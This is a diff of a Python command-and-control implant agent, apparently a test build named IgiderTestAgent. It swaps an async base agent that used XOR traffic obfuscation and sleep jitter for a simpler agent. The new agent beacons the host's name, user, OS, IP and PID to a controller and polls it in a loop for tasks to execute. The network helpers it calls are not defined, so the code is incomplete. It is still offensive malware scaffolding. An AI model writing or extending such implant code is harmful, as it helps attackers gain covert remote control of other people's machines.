@@ -1,171 +1,167 @@
-import asyncio
-import json
+#!/usr/bin/env python3
 import os
 import sys
+import json
 import base64
-import random
-import string
 import time
-import uuid
-from typing import Dict, List, Tuple, Optional
+import random
+import socket
+import platform
+import subprocess
+from datetime import datetime
 
-# Custom encryption can be added here for communication obfuscation
-class Crypto:
-    @staticmethod
-    def encrypt(data: bytes, key: bytes) -> bytes:
-        # Simple XOR encryption for demonstration
-        result = bytearray()
-        for i in range(len(data)):
-            result.append(data[i] ^ key[i % len(key)])
-        return bytes(result)
-    
-    @staticmethod
-    def decrypt(data: bytes, key: bytes) -> bytes:
-        # XOR decryption (same operation as encryption)
-        return Crypto.encrypt(data, key)
+# Will be replaced during build
+VERSION = "{{VERSION}}"
+DEBUG = False
 
-class AgentMessage:
-    def __init__(self, message_type: str, data: dict):
-        self.message_type = message_type
-        self.data = data
-        self.uuid = str(uuid.uuid4())
-        self.timestamp = int(time.time())
-    
-    def to_json(self) -> str:
-        return json.dumps({
-            "type": self.message_type,
-            "data": self.data,
-            "uuid": self.uuid,
-            "timestamp": self.timestamp
-        })
-    
-    @classmethod
-    def from_json(cls, json_str: str) -> 'AgentMessage':
-        data = json.loads(json_str)
-        msg = cls(data["type"], data["data"])
-        msg.uuid = data["uuid"]
-        msg.timestamp = data["timestamp"]
-        return msg
-
-class BaseAgent:
+class IgiderTestAgent:
     def __init__(self):
-        # Agent configuration
-        self.uuid = str(uuid.uuid4())
-        self.hostname = os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', 'unknown')
-        self.username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
-        self.pid = os.getpid()
-        self.os = sys.platform
+        self.uuid = self.generate_uuid()
+        self.hostname = socket.gethostname()
+        self.username = self.get_username()
+        self.os_type = platform.system()
+        self.commands = {
+            "ls": self.ls_command
+        }
+        self.debug_print(f"IgiderTest Agent v{VERSION} initialized")
+        self.debug_print(f"UUID: {self.uuid}")
         
-        # C2 profile configuration will be loaded from c2_profiles
-        self.c2_profile = None
-        self.encryption_key = os.urandom(16)  # Generate random encryption key
-        self.commands = {}
-        self.checkin_interval = 10  # seconds
-        self.jitter = 0.2  # 20% jitter
-        self.is_running = False
-        
-    def register_command(self, command_name: str, command_function):
-        """Register a command handler function"""
-        self.commands[command_name] = command_function
+    def debug_print(self, message):
+        if DEBUG:
+            print(f"[DEBUG] {message}")
     
-    def get_checkin_data(self) -> dict:
-        """Generate initial checkin data for the agent"""
-        return {
+    def generate_uuid(self):
+        """Generate a unique identifier for this agent."""
+        return f"igider-{random.randint(10000, 99999)}"
+    
+    def get_username(self):
+        """Get the current username."""
+        if self.os_type == "Windows":
+            return os.environ.get("USERNAME", "unknown")
+        else:
+            return os.environ.get("USER", "unknown")
+    
+    def ls_command(self, args=None):
+        """List directory contents."""
+        try:
+            target_dir = args.strip() if args else "."
+            if not os.path.exists(target_dir):
+                return {"status": "error", "message": f"Directory not found: {target_dir}"}
+            
+            files = []
+            for entry in os.scandir(target_dir):
+                file_info = {
+                    "name": entry.name,
+                    "is_dir": entry.is_dir(),
+                    "size": entry.stat().st_size if not entry.is_dir() else 0,
+                    "permissions": oct(entry.stat().st_mode)[-3:],
+                    "last_modified": datetime.fromtimestamp(entry.stat().st_mtime).strftime('%Y-%m-%d %H:%M:%S')
+                }
+                files.append(file_info)
+            
+            return {
+                "status": "success", 
+                "path": os.path.abspath(target_dir),
+                "files": files
+            }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+    
+    def process_command(self, command_data):
+        """Process incoming command from C2."""
+        try:
+            cmd_type = command_data.get("command")
+            cmd_args = command_data.get("arguments", "")
+            task_id = command_data.get("task_id", "unknown")
+            
+            self.debug_print(f"Processing command: {cmd_type} with arguments: {cmd_args}")
+            
+            if cmd_type in self.commands:
+                result = self.commands[cmd_type](cmd_args)
+                response = {
+                    "task_id": task_id,
+                    "status": "completed",
+                    "result": result
+                }
+            else:
+                response = {
+                    "task_id": task_id,
+                    "status": "error",
+                    "result": {"message": f"Command not supported: {cmd_type}"}
+                }
+                
+            return response
+        except Exception as e:
+            return {
+                "task_id": command_data.get("task_id", "unknown"),
+                "status": "error",
+                "result": {"message": f"Error processing command: {str(e)}"}
+            }
+    
+    def checkin(self):
+        """Send initial checkin data to the C2 server."""
+        checkin_data = {
+            "action": "checkin",
             "uuid": self.uuid,
             "hostname": self.hostname,
             "username": self.username,
-            "pid": self.pid,
-            "os": self.os,
-            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
-            "integrity_level": "high" if os.geteuid() == 0 else "medium" if hasattr(os, 'geteuid') else "unknown"
+            "os": self.os_type,
+            "ip": self.get_ip(),
+            "pid": os.getpid(),
+            "version": VERSION
         }
+        return checkin_data
     
-    async def handle_command(self, command_data: dict) -> dict:
-        """Process incoming command from the C2"""
-        command_name = command_data.get("command")
-        
-        if command_name not in self.commands:
-            return {
-                "status": "error",
-                "output": f"Command {command_name} not implemented"
-            }
-        
+    def get_ip(self):
+        """Get primary IP address."""
         try:
-            result = await self.commands[command_name](command_data)
-            return {
-                "status": "success",
-                "output": result
-            }
-        except Exception as e:
-            return {
-                "status": "error",
-                "output": f"Error executing {command_name}: {str(e)}"
-            }
+            # Create a socket to connect externally (doesn't actually connect)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
     
-    async def checkin(self):
-        """Initial checkin with C2 server"""
-        if not self.c2_profile:
-            raise ValueError("C2 profile not configured")
-        
-        checkin_data = self.get_checkin_data()
-        message = AgentMessage("checkin", checkin_data)
-        response = await self.c2_profile.send_message(message.to_json())
-        
-        if response:
-            try:
-                response_data = json.loads(response)
-                return response_data.get("status") == "success"
-            except:
-                return False
-        return False
-    
-    async def message_loop(self):
-        """Main agent message loop"""
-        self.is_running = True
-        
-        while self.is_running:
-            try:
-                # Get any waiting tasks from the C2
-                message = AgentMessage("get_tasking", {"uuid": self.uuid})
-                response = await self.c2_profile.send_message(message.to_json())
-                
-                if response:
-                    try:
-                        response_data = json.loads(response)
-                        tasks = response_data.get("tasks", [])
-                        
-                        for task in tasks:
-                            # Execute the command
-                            result = await self.handle_command(task)
-                            
-                            # Send the result back
-                            result_message = AgentMessage("task_result", {
-                                "task_id": task.get("id"),
-                                "result": result
-                            })
-                            await self.c2_profile.send_message(result_message.to_json())
-                    except Exception as e:
-                        print(f"Error processing tasks: {str(e)}")
-            except Exception as e:
-                print(f"Error in message loop: {str(e)}")
+    def run(self):
+        """Main agent execution loop."""
+        try:
+            # Initial check-in
+            initial_data = self.checkin()
+            response = send_data(initial_data)
             
-            # Sleep with jitter
-            sleep_time = self.checkin_interval * (1 + random.uniform(-self.jitter, self.jitter))
-            await asyncio.sleep(sleep_time)
-    
-    def set_c2_profile(self, profile):
-        """Set the C2 profile for this agent"""
-        self.c2_profile = profile
-    
-    async def start(self):
-        """Start the agent"""
-        # Initial checkin
-        if await self.checkin():
-            # Start the main message loop
-            await self.message_loop()
-        else:
-            print("Failed to check in with C2 server")
-    
-    def stop(self):
-        """Stop the agent"""
-        self.is_running = False
+            if not response or "status" not in response or response["status"] != "success":
+                self.debug_print("Failed initial checkin, exiting")
+                return
+            
+            self.debug_print("Successfully checked in")
+            
+            # Main command loop
+            while True:
+                try:
+                    self.debug_print("Fetching tasks...")
+                    tasks = get_tasks(self.uuid)
+                    
+                    if tasks and "tasks" in tasks and tasks["tasks"]:
+                        for task in tasks["tasks"]:
+                            self.debug_print(f"Processing task: {task.get('task_id')}")
+                            result = self.process_command(task)
+                            self.debug_print(f"Sending result for task: {task.get('task_id')}")
+                            send_data(result)
+                    
+                    # Sleep to avoid hammering the C2
+                    time.sleep(5)
+                except Exception as e:
+                    self.debug_print(f"Error in main loop: {str(e)}")
+                    time.sleep(10)  # Sleep longer on error
+            
+        except KeyboardInterrupt:
+            self.debug_print("Agent execution interrupted")
+        except Exception as e:
+            self.debug_print(f"Fatal error: {str(e)}")
+
+# Main execution
+if __name__ == "__main__":
+    agent = IgiderTestAgent()
+    agent.run()
